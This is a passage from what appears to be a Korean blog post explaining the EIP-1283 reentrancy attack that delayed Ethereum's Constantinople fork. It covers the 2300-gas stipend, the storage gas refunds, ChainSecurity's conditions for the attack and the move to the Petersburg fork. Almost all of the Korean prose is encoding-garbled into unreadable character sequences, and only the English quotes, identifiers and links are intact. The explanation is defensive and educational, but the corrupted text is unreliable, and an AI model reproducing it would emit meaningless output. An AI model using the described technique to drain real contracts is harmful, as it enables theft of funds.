ì´ë”ë¥¼ ì „ì†¡í•˜ë„ë¡ í•˜ëŠ” ê²°ê³¼ê°€ ë˜ëŠ” ê²ƒì…ë‹ˆë‹¤. <b>ì´ë”ë¥¼ í•œ ë²ˆ ë” ì¸ì¶œí•  ìˆ˜ ìˆê²Œ ë˜ëŠ” ê²ƒì…ë‹ˆë‹¤(ì´ì¤‘ ì†¡ê¸ˆì¸ ì…ˆì…ë‹ˆë‹¤).</b> 
ë¬¼ë¡  _second ê³„ì •ì—ê²Œ ì „ì†¡ë˜ëŠ” ì´ë”ëŠ” ê³µê²©ìê°€ ì •ìƒì ìœ¼ë¡œ ì ë¦½í•œ ì´ë”ê°€ ì•„ë‹™ë‹ˆë‹¤!ğŸ˜ˆ


### Why is this attackable now?

ê³¼ê±° reentrancyì™€ ë‹¤ë¥¸ ì ì´ ë¬´ì—‡ì¼ê¹Œìš”? reentrancy ê³µê²©ì€ `msg.sender.call.value(_amount)()`ìœ¼ë¡œ ì´ë”ë¥¼ ì „ì†¡í•˜ë©´ì„œ 
ì—¬ë¶„ì˜ ê°€ìŠ¤ê°€ forward ë˜ëŠ” ë¶€ì‘ìš©ì„ ì´ìš©í–ˆë‹¤ë©´ ì´ë²ˆì—ëŠ” transferë¥¼ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤. transferë¥¼ ì‚¬ìš©í•˜ëŠ” ì†¡ê¸ˆì˜ íŠ¹ì§•ì€ ì»¨íŠ¸ë™íŠ¸ ê³„ì •ì´ fallback í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ fallback í•¨ìˆ˜ì— ë‚¨ì€ ê°€ìŠ¤ê°€ 
forwardë˜ì§€ ì•Šê³  "stipend" 2300 gasë¡œ ê³ ì •ë©ë‹ˆë‹¤(ë©”íƒ€ë§ˆìŠ¤í¬ì—ì„œ ì»¨íŠ¸ë™íŠ¸ì— ì´ë”ë¥¼ ì „ì†¡í•˜ëŠ” ê²½ìš°ì™€ëŠ” ë‹¤ë¦…ë‹ˆë‹¤).  

ë§Œì•½ì— EIP-1283ì´ ì ìš©ë˜ëŠ” ê²½ìš°ì—ëŠ” ì–´ë–»ê²Œ ë ê¹Œìš”? EIP-1283ì˜ ë¡œì§ì„ ë‹¤ì‹œ ë³´ê² ìŠµë‹ˆë‹¤.

>(2.2) If original value does not equal current value (this storage slot is dirty), 200 gas is deducted.

ì´ ê²½ìš°ì— ì´ˆê¸° ê°’ì€ 0ì…ë‹ˆë‹¤. ìµœì´ˆ splitsì— ê¸°ë¡ëœ ê°’ì€ 100ì…ë‹ˆë‹¤. ê·¸ë ‡ë‹¤ë©´ ë‘ ë²ˆì§¸ í˜¸ì¶œ, ê³µê²©ìì˜ fallback í•¨ìˆ˜ì—ì„œ splitsì„ 0ìœ¼ë¡œ ì—…ë°ì´íŠ¸í•œë‹¤ë©´? ê·¸ë ‡ìŠµë‹ˆë‹¤. ìœ„ì˜ ë¡œì§ì— ì˜í•´ 
200 gasê°€ ì†Œëª¨ ë©ë‹ˆë‹¤. ì´ê²ƒì€ fallbackì—ì„œ stipend 2300 gasë¡œ ê³ ì •ë˜ë”ë¼ë„ ë‹¤ë¥¸ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆëŠ” ì¶©ë¶„í•œ ê°€ìŠ¤ì…ë‹ˆë‹¤. 
ë”êµ¬ë‚˜ (2.2.2.A)ì— ì˜í•´ ë‚˜ì¤‘ì— 19800 gasë„ ë˜ëŒë ¤ ë°›ì„ ê²ƒì…ë‹ˆë‹¤.

>(2.2.2.A) If original value is 0, add 19800 gas to refund counter.

EIP-1283ìœ¼ë¡œ ì¸í•˜ì—¬ ì ˆì•½ëœ ê°€ìŠ¤ê°€ ê³µê²©ì ì»¨íŠ¸ë™íŠ¸ì—ê²Œ ë³´ì•ˆ ì·¨ì•½ì„±ì„ ê°€ì§„ ì»¨íŠ¸ë™íŠ¸ì˜ ìƒíƒœë¥¼ ë³€ê²½ì‹œí‚¤ëŠ”ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ì—¬ë¶„ì˜ ê°€ìŠ¤ë¥¼ ì£¼ëŠ” ì…ˆì´ ëœ ê²ƒì…ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ EIP-1283ì´ ì ìš©ë˜ê¸° ì „ì—ëŠ” ìƒíƒœ ê°’ì„ ì—…ë°ì´íŠ¸í•˜ëŠ” ê²½ìš° 5000 gasê°€ ì‚¬ìš©ë©ë‹ˆë‹¤. ë‹¹ì—°íˆ ê°€ìŠ¤ê°€ ëª¨ìë¥´ê¸° ë•Œë¬¸ì— ë¡¤ë°±ì´ ë˜ë©´ì„œ ì‹¤í–‰ì€ ì¤‘ë‹¨ë  ê²ƒì´ê³  _firstì—ê²Œ ì†¡ê¸ˆë˜ì—ˆë˜ ì´ë”ì˜ 
íŠ¸ëœì­ì…˜ë„ ì‹¤íŒ¨í•  ê²ƒì…ë‹ˆë‹¤.

ì´ëŸ¬í•œ ê³µê²©ì´ ê°€ëŠ¥í•œ ì¡°ê±´ì€ ë‹¤ìŒê³¼ ê°™ì´ ì •ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ChainSecurityê°€ ë¶„ì„í•œ ë‚´ìš©ì„ ê·¸ëŒ€ë¡œ ì¸ìš©í•©ë‹ˆë‹¤.

>1. There must be a function A, in which a transfer/send is followed by a state-changing operation. This can sometimes be non-obvious, e.g. a second transfer or an interaction with another smart contract.
2. There has to be a function B accessible from the attacker which (a) changes state and (b) whose state changes conflict with those of function A.
3. Function B needs to be executable with less than 1600 gas(2300 gas stipend - 700 gas for the CALL). 


ê²°êµ­ ì˜ˆì •ë˜ì—ˆë˜ ì½˜ìŠ¤íƒ„í‹°ë…¸í”Œ í•˜ë“œí¬í¬ëŠ” ì—°ê¸°ë˜ì—ˆê³  ë³´ë„ëœ ë°”ì— ë”°ë¥´ë©´ 2ì›” 25ì¼(ì ì •ì ì¸ ê³„íš) ë¸”ë¡ë²ˆí˜¸ 7,280,000ë¶€í„° í˜í…Œë¥´ë¶€ë¥´í¬(Petersburg) í¬í¬ì™€ í•¨ê»˜ ì½˜ìŠ¤íƒ„í‹°ë…¸í”Œì„ ì‹œí–‰í•  ê²ƒì´ë¼ê³  í•©ë‹ˆë‹¤.
ë‹¤ì‹œ ë§í•˜ë©´ EIP-1283ì„ í¬í•¨í•˜ì—¬ ì½˜ìŠ¤íƒ„í‹°ë…¸í”Œë¡œ ì—…ê·¸ë ˆì´ë“œ í•˜ê³  í˜í…Œë¥´ë¶€ë¥´í¬ í¬í¬ì—ì„œ ì´ìŠˆê°€ ëœ ë¶€ë¶„ì„ ë¹„í™œì„±í™”ì‹œí‚¤ëŠ” ìˆœì„œë¡œ ì§„í–‰í•  ì˜ˆì •ì´ë¼ê³  í•©ë‹ˆë‹¤. 

ì´ë”ë¦¬ì›€ ì»¤ë®¤ë‹ˆí‹°ì—ì„œëŠ” ì´ëŸ¬í•œ ë³´ì•ˆ ì´ìŠˆì— ëŒ€í•´ì„œ ì—¬ëŸ¬ ì˜ê²¬ì´ ì œì‹œë˜ëŠ” ê²ƒ ê°™ìŠµë‹ˆë‹¤. EIP-1283ì„ ì ìš©í•˜ê³  SSTOREì— ê°€ìŠ¤ê°€ 2300ë³´ë‹¤ ì‘ì•„ì§€ë©´ ë¡¤ë°±ì‹œí‚¤ëŠ” ì¡°ê±´ì„ ì¶”ê°€í•˜ìëŠ” ì˜ê²¬ë„ 
ìˆìŠµë‹ˆë‹¤. ì¦‰ 2300 gasë¥¼ ìƒíƒœë¥¼ ë³€ê²½í•˜ëŠ”ë° ì‚¬ìš©í•  ìˆ˜ ì—†ë„ë¡ í•˜ìëŠ” ê²ƒì…ë‹ˆë‹¤. ì•„ì˜ˆ EIP-1283ì„ íê¸°í•˜ìëŠ” ì˜ê²¬, ê·¸ë ‡ê²Œ opcodeë¥¼ ì†ëŒ€ì§€ ì•Šê³  ê°€ìŠ¤ ë¹„ìš©ì„ ì ˆê°í•  ìˆ˜ ìˆëŠ” 
ë‹¤ë¥¸ EIPë¥¼ ê³ ë ¤í•˜ìëŠ” ë“±ì˜ ì˜ê²¬ë„ ìˆìŠµë‹ˆë‹¤.

ì°¸ê³ ë¡œ EIP-1283ì´ ë°˜ì˜ëœ ê°€ë‚˜ìŠˆê°€ ë°°í¬ë˜ê³  ìˆìŠµë‹ˆë‹¤. GUIë²„ì „ì€ 1.3.0ì¸ë° ìœ„ì— ìˆëŠ” ì»¨íŠ¸ë™íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ reentrancy ë¬¸ì œë¥¼ í™•ì¸í•´ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[etheruem-blog]: https://blog.ethereum.org/
[eip-1283]: https://eips.ethereum.org/EIPS/eip-1283
[etheruem-yellowpaper]: https://github.com/ethereum/yellowpaper
[eip-1283-reentrancy]: https://medium.com/chainsecurity/constantinople-enables-new-reentrancy-attack-ace4088297d9